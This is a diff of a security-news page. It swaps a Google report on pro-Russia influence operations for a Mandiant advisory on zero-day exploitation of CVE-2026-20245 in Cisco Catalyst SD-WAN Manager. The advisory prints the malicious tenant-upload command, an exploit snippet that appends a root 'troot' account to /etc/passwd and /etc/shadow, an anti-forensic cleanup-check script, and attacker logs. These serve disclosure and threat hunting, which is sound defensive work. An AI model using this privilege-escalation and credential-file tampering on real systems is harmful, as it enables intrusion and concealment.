             <h2 class="article-title">Microsoft at Black Hat USA 2026: Defending trust in the age of AI and supply chain attacks</h2>
             <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/07/17/microsoft-at-black-hat-usa-2026-defending-trust-in-the-age-of-ai-and-supply-chain-attacks/" target="_blank">Original Link</a></p>
             <div class="content-text">Across the threat landscape, in this moment, one pattern sits at the center of the story: threat actors are following trust.
@@ -582,122 +627,216 @@ To learn more about Microsoft Security solutions, visit our [website.](https://w
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-7" class="article-body">
-            <h2 class="article-title">The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-influence-ecosystem/" target="_blank">Original Link</a></p>
-            <div class="content-text">The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem
-Google Threat Intelligence Group
-Google Threat Intelligence
-Visibility and context on the threats that matter most.
-[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
-Written by: James Sadowski, Alden Wahlstrom
+        <div id="art-8" class="article-body">
+            <h2 class="article-title">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/" target="_blank">Original Link</a></p>
+            <div class="content-text">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager
+Mandiant
+Written by: Chester Sng, Pete Boonyakarn, Logeswaran Nadarajan, Lukasz Lamparski
 Introduction
-Four years into Russia’s full-scale invasion of Ukraine, the pro-Russia influence ecosystem has evolved from a tool of war back into a global strategic asset. Since the mobilization of this ecosystem to support frontline objectives, we have witnessed the expedited development of new influence assets linked to multiple, expansive, covert information operations (IO) campaigns and a [revitalization](https://cloud.google.com/blog/topics/threat-intelligence/global-revival-of-hacktivism) of pro-Russia hacktivism at an unprecedented scale. While this threat activity initially adapted to encompass Ukraine-related priorities, it is gradually pivoting back to established Russian influence objectives for which the ecosystem was originally honed. This shift is significant because it likely signals increased focus outside of Ukraine, warning that pro-Russia influence activity targeting the European Union (EU), North Atlantic Treaty Organization (NATO), and other top targeting priorities may intensify.
-Ultimately, the war in Ukraine has provided a critical feedback loop for Russia to refine its influence activity, lessons that we anticipate will be applied as the ecosystem continues to reorient toward global strategic objectives while maintaining focus on Ukraine. Further, recent pro-Russia IO indicates the continued expansion of already diverse tactics, and the increasing use of [generative AI tooling](https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai) for planning, research, and content creation marks a forward trend in pro-Russia IO. Meanwhile, new and different actors have adopted IO tactics to meet an increasingly diverse set of challenges, signaling growing Russian reliance on influence tactics. Together, these trends likely demonstrate the Kremlin's perception of these tactics as cost effective and successful. The interconnected nature of the ecosystem's disparate components makes it resilient to limited scope disruptions, which defenders must consider to effectively mitigate pro-Russia influence threats.
-The Ecosystem at a Glance: Objectives, Targeting, and Tactics
-Russia's modern approach to information operations is built on the conceptual foundation of Soviet-era "[active measures](https://www.marshallcenter.org/en/publications/security-insights/active-measures-russias-covert-geopolitical-operations-0)" adapted for the digital age. Alongside disruptive cyberattacks dating back to the early 2000s, the Kremlin has increasingly harnessed internet-based platforms for espionage and information operations. Russia's approach has evolved from rudimentary, singular operations into a complex, self-sustaining environment intentionally curated by the Russian Government that blends overt, covert, and independent elements to advance Kremlin interests both at home and abroad.
-Core Influence Objectives
-GTIG’s observations suggest the primary strategic motivations driving the pro-Russia influence ecosystem fall into five categories, each aiming to achieve military and/or political objectives through psychological manipulation of the target audience (Figure 1). Collectively, these objectives informally depict a global influence strategy: through the furthest reach of its influence, the Kremlin seeks to diminish Western primacy and advance Russia's global position; within its surrounding region, it strives to retain and return Moscow's dominance; and at home, it works to ensure the stability of the political regime.
-Figure 1: Core objectives of the pro-Russia influence ecosystem
-Targeting
-Pro-Russia influence operations are pivoting from the [near singular focus on Ukraine](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine) that dominated the ecosystem since 2022. We expect influence operations advancing Russia's war-specific interests to continue. However, as Russia seeks to reemerge from international isolation, we have increasingly observed a concurrent focus on pre-war pro-Russia influence objectives.
-The current and historical targeting scope of each ecosystem component exposes both the Kremlin's global ambitions and the realistic limitations of its power projection. State-owned media organizations produce content intended to serve populations across six continents, but in recent years, sanctions and other factors have limited its production and distribution. Meanwhile, covert operations have appeared more limited in scope, primarily targeting the West and countries surrounding Russia, with intermittent operations targeting the Middle East and Africa, indicating that finite resources necessarily limit these operations (Figure 2).
-Top Regional Targets
+In early 2026, Mandiant identified a threat actor targeting SD-WAN infrastructure at a service provider. After gaining initial access, the threat actor exploited a zero-day vulnerability ([CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)) in Cisco Catalyst SD-WAN to escalate privileges from a compromised administrative account to root-level access.
+The vulnerability stems from the device’s file upload feature lacking the ability to properly filter malicious data.
+Throughout the intrusion, to maintain operational security and avoid detection, the threat actor consistently employed anti-forensic techniques, selectively deleting and restoring system configuration files that were modified during their activities.
+Key Observations
 -
-The United States and Europe: The Kremlin has long viewed the West as a top adversary of Russia. Accordingly, the US and Europe are top targets of covert pro-Russia information operations, especially aimed at undermining political stability within these countries and the unity between them. NATO and the EU embody the collective "West" and are Russia's perceived top adversaries, second only to the US independently.
+Rogue Peering and Credential Manipulation: In March 2026, a threat actor established initial access via unauthorized peering connections to facilitate Secure Shell (SSH) access. The threat actor used that access to manipulate default account passwords to evade detection.
 -
-Russia's "Near Abroad": Since the dissolution of the Soviet Union, Moscow has asserted that the countries that formerly comprised part of the USSR now reside in Russia's so-called "sphere of influence." Covert influence targeting this region directly reflects Moscow's assertion that Russia is a world power entitled to special privileges within its neighborhood.
+Exploitation of CVE-2026-20245: Subsequently, the attacker leveraged a zero-day privilege escalation vulnerability (now tracked as CVE-2026-20245) in Cisco Catalyst SD-WAN Manager to gain root-level access via a malicious CSV upload.
 -
-The Middle East and Africa: Over the past decade, Russian efforts to reassert itself as a global power have included high-profile investments in cultivating Russia's standing in the Middle East and
-[Africa](https://cloud.google.com/blog/topics/threat-intelligence/io-campaigns-russian-prigozhin-persist). Covert pro-Russia influence activity is likely deployed in tandem as intended support for other Russian initiatives in these regions. -
-Russia Domestic: Internally targeted covert IO is a well-established component of pro-Russia influence activity, deployed by regime-aligned actors to promote Kremlin policies and repress opposition voices.
-Targeted Entities and Global Events
+Extensive Anti-Forensic Cleanup: The threat actor deleted malicious files, reverted configuration changes, and executed a validation script to ensure indicators are purged.
+What is SD-WAN?
+Traditional Wide Area Networks (WANs) rely heavily on physical, proprietary hardware routers to direct traffic. This model is often rigid, complex to scale, and struggles to handle the demands of modern cloud computing.
+Software-Defined Wide Area Network (SD-WAN) solves this by decoupling the network’s management and control logic from the underlying physical hardware. Instead of configuring individual routers one by one, a centralized software controller is used to orchestrate the entire network from a single dashboard. SD-WANs are typically used by highly distributed organizations, such as banks, retail corporations, technology services, and healthcare providers, to securely connect multiple remote branch locations directly to central cloud services.
+What is Peering?
+Within an SD-WAN fabric, peering is the logical process of establishing a trusted, authenticated relationship between distinct network components, such as edge routers, regional hubs, and central controllers.
+Before any data can be securely transmitted across the network fabric, these devices must perform a digital handshake. During the peering phase, devices mutually authenticate each other using cryptographic certificates. Once identity and trust are verified, they exchange underlying routing tables and automatically build secure tunnels to facilitate safe data transport.
+Additional Vulnerabilities in Cisco Catalyst SD-WAN Controllers
+[CVE-2026-20127](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa-EHchtZk) and [CVE-2026-20182](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa2-v69WY2SW) are critical vulnerabilities recently disclosed by Cisco that affect the peering authentication mechanism for Cisco Catalyst SD-WAN controllers. Both vulnerabilities could allow an unauthenticated, remote attacker to bypass authentication and obtain administrative privileges.
+Intrusion Campaign Overview
+Initial Access Via Rogue Peering Connections
+From late 2025 to January 2026, Mandiant observed multiple unauthorized peering connections to the victim’s SD-WAN Manager devices. It is possible that these connections occurred due to the exploitation of CVE-2026-20127 or CVE-2026-20182 as the vulnerabilities were not disclosed, and patches were not available during this period.
+Beginning in March 2026, further unauthorized peering connections were seen on a device running a software version unaffected by CVE-2026-20127. However, Cisco confirmed that these connections did not leverage CVE-2026-20182 either, and could instead be using stolen certificate material from a previous compromise of the same device.
+It is unclear if the same threat actor was responsible for the late 2025 to January 2026 and March 2026 rogue peering activity.
+Successful Authentications By Altering The Admin Account Password
+In March 2026, the threat actor established new rogue peer connections and successfully authenticated to the SD-WAN Manager device via SSH using the vmanage-admin
+account on the same victim devices.
+Once authenticated via SSH, the threat actor executed commands to change the password of the default admin
+account. The threat actor authenticated directly to the SD-WAN Manager web application interface using the admin
+account and exfiltrated configurations of the SD-WAN fabric.
+[2026-03-07T01:31:48.464Z]"POST /j_security_check HTTP/1.1" 200 - 31 0 1288 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:49.017Z] "GET /dataservice/system/device/vedges HTTP/1.1" 200 - 0 10114 127 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:50.017Z] "GET /dataservice/system/device/controllers HTTP/1.1" 200 - 0 15815 100 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:51.925Z] "GET /dataservice/template/config/attached/<Device ID> HTTP/1.1" 200 - 0 3732 18 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:52.493Z] "GET /dataservice/template/config/running/<Device ID> HTTP/1.1" 400 - 0 134 19 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
+<...>
+Figure 1: Threat actor authentication and configuration extraction
+The threat actor subsequently used their active vmanage-admin
+session to change the password of the admin
+account back to its original state before terminating their active session. This activity was likely performed to reduce the probability of detection by an administrator trying to log into the device during day-to-day operations.
+The vmanage-admin
+and admin
+accounts are default accounts on Cisco Catalyst SD-WAN controllers that have different privileges, but [neither possesses root shell access](https://www.cisco.com/c/en/us/td/docs/routers/sdwan/17-x/systems-interfaces/systems-interfaces-guide-17-x/users-and-access.html).
+Exploitation of CVE-2026-20245 to Escalate Privileges
+Mandiant observed that in April 2026, after establishing an SSH session with the admin
+account, the threat actor exploited CVE-2026-20245 by executing the following command to upload a file named evil_tenant.csv
+:
+request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
+Figure 2: Malicious file upload
+[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx), a vulnerability reported to Cisco by Mandiant, exists in the command-line interface (CLI) of Cisco Catalyst SD-WAN Controllers that could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system.
+The evil_tenant.csv
+file contains the exploit payload. The following code block (Figure 3) shows a snippet of the exploit which attempts to append malicious entries to the system's /etc/passwd
+and /etc/shadow
+files.
+if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ] && grep -q '<redacted>' /usr/share/viptela/vbond_vsmart_tenant_list 2>/dev/null; then
+echo absent > /home/admin/.orig_vbond_vsmart_tenant_list.state;
+elif [ -e /usr/share/viptela/vbond_vsmart_tenant_list ]; then
+echo present > /home/admin/.orig_vbond_vsmart_tenant_list.state;
+cp -a /usr/share/viptela/vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list;
+else
+echo absent > /home/admin/.orig_vbond_vsmart_tenant_list.state;
+fi;
+cp -a /etc/passwd /home/admin/.orig_passwd;
+cp -a /etc/shadow /home/admin/.orig_shadow;
+grep -q '^troot:' /etc/passwd || echo 'troot:x:0:0:root:/root:/bin/bash' >> /etc/passwd;
+grep -q '^troot:' /etc/shadow || echo 'troot:<redacted>:19000:0:99999:7:::' >> /etc/shadow
+Figure 3: Appending malicious entries
+Through this command, the threat actor achieved the following:
 -
-The Olympics: Russia has long viewed Olympic participation as a point of national prestige, and GTIG has observed notable Russian influence activity targeting the
-[Olympics](https://cloud.google.com/blog/topics/threat-intelligence/cyber-threats-2024-paris-olympics)in the face of Russian participation bans. -
-War in Ukraine: The
-[war in Ukraine](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine)has been a key driver of Russia's influence activity, including attempts to influence events on the ground as well as influence activity intended to advance Moscow's interests elsewhere vis-a-vis the war. GTIG expects that Ukraine will remain a priority in Russia's targeting calculus during the post-conflict phase following any future peace agreements. -
-Elections: Election targeting aligns with multiple Russian influence objectives, including attempting to undermine confidence in democratic institutions as well as internally weakening perceived Western adversaries. These operations regularly target elections in countries that are already prioritized by ongoing pro-Russia influence activity.
+Backed up the original
+vbond_vsmart_tenant_list
+configuration file, which would have been overwritten by the contents ofevil_tenant.csv
+during the exploit. This backup was likely created to allow the actor to restore the file later, ensuring the SD-WAN Manager device did not load an invalid configuration that might alert administrators. -
+Created backups of the original
+/etc/passwd
+and/etc/shadow
+files. -
+Created a user account named
+troot
+with full root privileges.
+Mandiant subsequently observed the threat actor accessing this new troot
+account from the admin
+account via the su
+(substitute user) command.
+Anti-Forensic Techniques
+Mandiant identified that the threat actor deleted all files they created, including evil_tenant.csv
+, and restored any system configurations they modified. These deletion and modifications were done to minimize their forensic footprint.
+In addition to this, Mandiant also observed execution of a validation script, which checks if indicators of the threat actor's activities are removed.
+for f in /home/admin/evil_tenant.csv /home/admin/.orig_vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list.state /home/admin/.orig_passwd /home/admin/.orig_shadow;
+do if [ -e "$f" ];
+then echo PRESENT:$f; ls -ld "$f";
+else echo ABSENT:$f;
+fi;
+done;
+if grep -q '^troot:' /etc/passwd;
+then echo PRESENT:/etc/passwd:troot;
+else echo ABSENT:/etc/passwd:troot;
+fi;
+if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ];
+then echo PRESENT:/usr/share/viptela/vbond_vsmart_tenant_list; ls -ld /usr/share/viptela/vbond_vsmart_tenant_list;
+else echo ABSENT:/usr/share/viptela/vbond_vsmart_tenant_list;
+fi
+Figure 4: Validation script
+This script checks for the presence of the following:
 -
-Ad Hoc Geopolitical Flashpoints and Global Events: Russian influence actors have a history of pivoting activity to engage with emerging geopolitical developments and events, such as the
-[COVID-19](https://cloud.google.com/blog/topics/threat-intelligence/limited-shifts-cyber-threat-landscape-driven-covid-19?e=48754805)pandemic or the[2026 Middle East](https://apnews.com/article/iran-war-images-misinformation-russia-israel-9e495017dc5c4bf24a0b6152863dbfb1)conflict. This flexible target selection often overlaps or is aligned with other Russian priorities, making previously observed Russian influence activity helpful in anticipating which events may be appropriated.
-Figure 2: Priority targets of the ecosystem
-Tactics
-Converging geopolitical and technological developments make the evolution of pro-Russia influence tactics a particularly important space to monitor right now. The pro-Russia influence ecosystem expanded to support the war effort, bringing change across the spectrum of activity and providing operators the opportunity to hone their tactics, techniques, and procedures (TTPs) in the rapid feedback loop of war. Meanwhile, the emergence and increased democratization of [generative AI](https://cloud.google.com/blog/topics/threat-intelligence/distillation-experimentation-integration-ai-adversarial-use) tooling has brought both promised and already realized opportunities to support all phases of the IO lifecycle. The following are a sample of key tactics that illustrate how pro-Russia actors currently blend well-tested methods with new technological developments to reach audiences through diverse means:
+Threat actor-created files in
+/home/admin.
 -
-Generative AI: GTIG
-[has observed](https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai)pro-Russia influence actors increasingly leverage AI tooling to support different stages of their operations, including support for planning and general research as well as content creation. -
-Google Threat Intelligence Group (GTIG) is closely tracking the transition from nascent AI-enabled operations to the maturing, industrial-scale application of generative models within adversarial workflows across threats ranging from espionage and crime to IO. Please see our latest
-[AI threat tracker](https://cloud.google.com/blog/topics/threat-intelligence/ai-vulnerability-exploitation-initial-access)for more information on how this threat is developing based on our insights, and what Google is doing to protect our customers. -
-Narrative Resonance: Hijacking existing ideological and emotional fissures within a society provides pro-Russia influence actors tailored narratives to target audiences and potentially increases potential engagement and impact.
+troot
+account in thepasswd
+andshadow
+files. -
+vbond_vsmart_tenant_list
+, and if it exists, inspect information about the file. This is likely to check if the original file was restored.
+Outlook and Implications
+This campaign underscores the living off the edge paradigm, where threat actors prioritize the compromise of network appliances to bypass traditional security perimeters. As organizations increasingly adopt software-defined networking, the orchestrators managing these environments become primary targets. These devices offer a black box environment for threat actors: they often lack the telemetry required for deep forensic analysis, and their role as a central control plane provides a stealthy platform for persistent, wide-scale access to internal enterprise traffic. For state-sponsored actors, the ability to exploit zero-day vulnerabilities in these platforms remains a premier vector for long-term strategic intelligence collection. Google Threat Intelligence Group (GTIG) has [closely](https://cloud.google.com/blog/topics/threat-intelligence/zero-days-exploited-2022) [tracked](https://cloud.google.com/blog/topics/threat-intelligence/2023-zero-day-trends) [and](https://cloud.google.com/blog/topics/threat-intelligence/2024-zero-day-trends) [reported](https://cloud.google.com/blog/topics/threat-intelligence/2025-zero-day-review) on increased zero-day exploitation of edge devices over the past several years.
+Remediation and Hardening
 -
-Cyber-Enabled IO: Influence campaigns frequently coincide with destructive cyberattacks, such as the deployment of
-[wiper malware](https://cloud.google.com/blog/topics/threat-intelligence/gru-disruptive-playbook?e=48754805)alongside website defacements containing false surrender messages, or the historic use of "hack and leak" campaigns in which exfiltrated data, sometimes manipulated, is then publicized through an actor-controlled false persona. In some instances, Russian actors may even leverage direct cyber espionage targeting as a way to achieve psychological effects, intending to influence victims' behavior through intimidation. -
-Media Mimicry: Pro-Russia actors have attempted to mimic legitimate media at scale and through a variety of means, including via the wholesale appropriation of legitimate media brands or developing inauthentic media brands that generally masquerade as independent news sources. These tactics are intended to add a veneer of legitimacy to the promoted narratives.
+Perform IOC Sweep / Threat Hunting: Collect logs and diagnostic data from SD-WAN devices by executing
+request admin-tech
+command on all control-plane components. Scan these collections for known IOCs and execute threat hunts focused on the TTPs identified in the Detections and Hunting section of this blog post. If true positive hits are observed, perform a full investigation. -
+Manual Remediation Support: As per Cisco’s guidance, any confirmed indicators of compromise or suspicious activity should be forwarded to
+[Cisco Technical Assistance Center (TAC)](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html)for comprehensive review and remediation assistance. -
+Prioritize Immediate Patching and Upgrades: Organizations must prioritize upgrading Cisco Catalyst SD-WAN Manager to fixed software releases, specifically versions 20.9.9.2, 20.12.7.2, 20.15.4.5, 20.15.5.3, 20.18.3.1, 26.1.1.2, or later, to remediate
+[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). -
+Implement Cisco Catalyst SD-WAN Hardening and Logging Guidelines: Organizations should follow the comprehensive security best practices and configuration standards detailed in the
+[Cisco Catalyst SD-WAN Hardening Guide](https://sec.cloudapps.cisco.com/security/center/resources/Cisco-Catalyst-SD-WAN-HardeningGuide). This guide provides a robust defense-in-depth framework for securing all SD-WAN components including the management, control, and data planes against unauthorized access.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a free [GTI Collection](https://www.virustotal.com/gui/collection/d966161b93100fb8905b9b81bd03e57bbc93f21534acee88999e77798e913d5b/summary) for registered users.
+Network Indicators
+File Indicators
+Due to the threat actor's extensive anti-forensic cleanup, several files associated with this intrusion were overwritten or deleted. However, forensic remnants of the malicious CSV payload were recovered.
+Detections and Hunting
+Mandiant encourages organizations to conduct proactive threat hunts focused on the tactics, techniques, and procedures (TTPs) outlined in this report to identify activity that may otherwise blend into routine operations. Because certain indicators of compromises may mirror legitimate administrative actions, it is critical to assess these observations against the established network posture to minimize false positives.
+As per Cisco’s guidance, any suspicious activity or confirmed IOCs should be forwarded to the Cisco TAC for comprehensive review and assistance.
+Unauthorized SSH Connections as vmanage-admin
+Monitor authentication logs (/var/log/auth.log
+) for logins originating from unexpected external IP addresses using the vmanage-admin user account.
+Jan 01 07:58:00 vManage sshd[20766]: Accepted publickey for vmanage-admin from <Threat Actor IP> port 48373 ssh2: RSA SHA256:<redacted>
+Jan 01 08:01:00 vManage sshd[25178]: Accepted keyboard-interactive/pam for admin from <Threat Actor IP> port 60552 ssh2
+Figure 5: SSH from unexpected origins
+Suspicious Password Change Events
+Audit password changes in /var/log/auth.log
+targeting the admin account in quick succession, particularly where credentials are set and subsequently reverted.
+Jan 01 08:00:00 vManage usermod[12345]: change user 'admin' password
+Jan 01 08:15:00 vManage usermod[12345]: change user 'admin' password
+Figure 6: Password changes
+Defenders should also inspect rollback files present within /var/confd/rollback/
+for configuration delta commits targeting user passwords:
+# Created by: vmanage-admin
+# Date: 2026-01-01 08:00:00
+# Via: netconf
+# Type: delta
+# Label:
+# Comment:
+# No: 10000
+# TransactionId: 12345678
+# Hostname: vManage
+system {
+aaa {
+user admin {
+password <redacted>;
+}
+}
+}
+Figure 7: Rollback files
+Suspicious Execution of the su
+Command
+Audit terminal command history and system logs (/var/log/auth.log
+) for successful switch user (su
+) executions from the admin account to unauthorized accounts (e.g., troot
+).
+Jan 01 08:03:00 vManage su[24289]: Successful su for troot by admin
+Figure 8: su
+logins
+Exploitation of CVE-2026-20245
+Monitor script logs (/var/log/scripts.log
+) for execution anomalies involving unauthorized execution of vconfd_script_upload_tenant_list.sh
+.
+Jan 01 08:01:05 vManage vScript: Tenant list upload per vsmart serial number: /usr/bin/vconfd_script_upload_tenant_list.sh -cli path /home/admin/evil_tenant.csv vpn 0
+Jan 01 08:01:05 vManage vScript: uploading tenant list via VPN 0 true
+Jan 01 08:01:05 vManage vScript: Copying ... /home/admin/evil_tenant.csv via VPN 0
+Jan 01 08:01:05 vManage vScript: Successfully loaded the tenant placement file
+Figure 9: Execution anomalies
+Defenders can also query active command execution history using show history within the Viptela CLI for the specific administrative upload commands:
+01-01 08:01:05 -- request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
+Figure 10: Command execution
+Google Security Operations (SecOps)
+Google SecOps customers have access to these broad category rules and more under the Mandiant Intel Emerging Threats rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:
 -
-Direct Dissemination: Pro-Russia influence actors have used closed communication channels, such as emails, SMS text messages, and messenger apps, to disseminate various types of pro-Russia narratives as an adjunct to or outside typical social media-focused operations.
-Core Ecosystem Components
-The current pro-Russia influence ecosystem operates across a spectrum from official government communications to deniable covert actions conducted by intelligence services and "patriotic" proxies. GTIG identified six core components that represent key activity types (Figure 3). While many elements are state-directed or state-affiliated, the ecosystem is also a cultivated, self-sustaining system: various actors, often without explicit direction, amplify Kremlin-friendly narratives and pursue actions that advance Russia's strategic interests. This fluidity provides resilience and complicates attribution, mirroring the longstanding Kremlin strategy to co-opt non-state actors, including criminal networks for [finance](https://www.rusi.org/explore-our-research/publications/commentary/operation-destabilise-russia-organised-crime-and-illicit-finance) or [illicit logistics](https://www.bbc.com/news/articles/cz91dk0l50no), to achieve state objectives without direct attribution. Although each of the core ecosystem components serves as a unique lever the Russian Government can employ to achieve desired objectives, they are regularly used together. For instance, while the entire pro-Russia hacktivist landscape is not state-sponsored, the Russian intelligence services have used both genuine and fabricated hacktivist personas to launder stolen data as part of blended cyber espionage and IO hybrid operations.
-Figure 3: Core components of the pro-Russia influence ecosystem
-An Interconnected Ecosystem Enhances Influence Utility
-Figure 4 illustrates the complex, interconnected nature of the pro-Russia influence ecosystem by mapping relationships between a selection of key actors and organizations across five of the core components. The ecosystem functions as a cohesive unit, not only through shared objectives, but also through direct cross-component interactions. The Russian Government functions as the sixth core ecosystem component, setting the policy and talking points that inform the ecosystem’s promoted narratives and sponsoring overt and covert assets throughout the other five components diagrammed in Figure 4. Through these levers, the Kremlin fosters the cross-component links that underpin the ecosystem, enhancing its overall utility as a versatile tool of state influence.
-Figure 4: Subset of actors that illustrate how different components of the ecosystem interact with each other
-10 Key Dynamics for Understanding the Pro-Russia Influence Ecosystem
-The scope and diversity of activity in the pro-Russia influence ecosystem challenges defenders tasked with enumerating, tracking, and countering its threats. GTIG has distilled 10 key ecosystem dynamics based on our current understanding of its components and how they each enable covert influence activity. These dynamics frame critical aspects of how activity manifests within the ecosystem, providing a high-level guide to understand and track these threats.
-Large-scale IO campaigns are an integral element of the pro-Russia influence ecosystem. Major pro-Russia IO campaigns have been an enduring feature of the pro-Russia ecosystem, with new campaigns emerging as previous ones fall into inactivity. Maintaining extensive IO campaigns and their associated established influence infrastructure enables proactive [messaging](https://home.treasury.gov/news/press-releases/jy0628) on strategic issues and underpins a capability that can be rapidly adapted for emerging domestic and global priorities.
+Privileged Account Append to Passwd Database
 -
-Long-established IO campaigns, like Secondary Infektion,
-[pivoted to meet](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine)new strategic needs as Russia’s 2022 invasion of Ukraine began. New IO campaigns, such as “Operation Overload,” subsequently emerged to support the war effort; while Secondary Infektion has become dormant, these “successor” campaigns have since been leveraged to advance other global Russian influence objectives beyond the war itself.
-Pro-Russia actors often prioritize persistence and the range of tactics they leverage reflects this. In the face of public exposure and disruption, pro-Russia actors and their infrastructure have often remained persistent, sometimes making tactical adjustments to mitigate the effects of detection and disruption and other times continuing operations unabated.
+Grep Privileged User Account Discovery in Passwd or Shadow
 -
-These persistence tactics include the Doppelganger campaign and overt
-[Russian media](https://www.bloomberg.com/news/articles/2023-11-23/ukraine-war-how-kremlin-propaganda-websites-dodge-disinformation-sanctions#xj4y7vzkg)’s respective cycling of domain infrastructure and/or use of mirror domains to overcome exposure, platform bans and sanctions. Influence operators also frequently continue using compromised assets, sometimes mocking their exposure, as seen with the legacy US-targeted NAEBC campaign and the APT44-affiliated hacktivist persona XakNet Team.
-Figure 5: NAEBC-linked persona account mocking public exposure of influence assets (left), and GRU-sponsored XakNet Team persona mocking then-Mandiant (now part of Google Threat Intelligence Group) attribution of the group’s activities to the GRU (right)
-Pro-Russia and Russian cyber espionage groups leverage IO tactics to support their operations and weaponize stolen data and/or illicit access. While less frequent, this [hybrid activity](https://cloud.google.com/blog/topics/threat-intelligence/russian-espionage-influence-ukrainian-military-recruits-anti-mobilization-narratives) is a critical dynamic within the pro-Russia influence ecosystem. GTIG has previously observed operations used to shape narratives around [cyberattacks](https://cloud.google.com/blog/topics/threat-intelligence/gru-disruptive-playbook) and influence events on the ground and to conduct foreign political interference, including the repeated targeting of [foreign elections](https://cloud.google.com/blog/topics/threat-intelligence/cyber-threats-global-elections), reported in Spring 2024. We have attributed some observed instances of this to Russian government-sponsored threat actors.
+Hidden Backup of Sensitive System Files
 -
-Russian state sponsored or pro-Russia hacktivist groups have long relied on public advertisement of real or claimed data exfiltration to highlight their operations, intimidate targets, or sway public opinion. In 2022, UNC4057 (COLDRIVER) used data stolen from espionage targets in a high profile hack-and-leak operation seeking to exacerbate divisions in UK politics. More recently, the self-proclaimed hacktivist group
-[PalachPro](https://cert.gov.ua/article/6287707)claimed in February 2026 to have gained unauthorized access to a Ukrainian government online portal and publicly posted[screenshots](https://caspianpost.com/regions/russian-hackers-target-ukraine-s-starlink-authorisation-service)of the claimed compromise. The Ukrainian government has previously noted that the portal does not store the type of data the threat actor claimed to compromise, suggesting the public posting was likely intended as influence activity, attempting to create the illusion of a more serious threat.
-Figure 6: UNC4057 leak website attempting to inflame public debate
-Pro-Russia hacktivists serve a direct influence function. Modern pro-Russia hacktivism has evolved into an important component of the influence [ecosystem](https://cloud.google.com/blog/topics/threat-intelligence/global-revival-of-hacktivism) that blends [state-backed actors](https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm) leveraging [hacktivist tactics](https://www.justice.gov/opa/pr/justice-department-announces-actions-combat-two-russian-state-sponsored-cyber-criminal) with an evolving cohort of likely third-party hacktivist actors that support Russia's geopolitical interests. Pro-Russia hacktivist groups gain domestic and foreign attention for strategic messaging via their [claimed threat activity](https://cloud.google.com/blog/topics/threat-intelligence/killnet-new-capabilities-older-tactics), amplify narratives directly seeded in overt ecosystem segments, and at times also support traditional IO activity or create a means of plausible deniability for state-sponsored espionage actors.
--
-The self-proclaimed hacktivist group NoName057(16) emerged following the Russian invasion of Ukraine in 2022, primarily targeting Ukraine and its partners and allies with DDoS attacks and various network intrusions. It has targeted high profile events, such as the Milano Cortina Winter Olympics, institutions like the French National Assembly, and critical infrastructure and transportation targets in Germany. Often their messaging cites grievances with overt acts of Western support for Kyiv, suggesting the group advances Russian interests not only through the targeting of perceived Russian adversaries but also in gaining attention for its pro-Russia messaging.
-Established ecosystem components facilitate the cultivation of new assets and activity. Inter-ecosystem cross-promotion helps overcome challenges of audience building by directing traffic toward [new assets](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-2022-midterm-elections/), operations, and narratives, enabling rapid deployment of new and existing IO capabilities. This directly supports a self-sustaining cycle that maintains and expands the ecosystem.
--
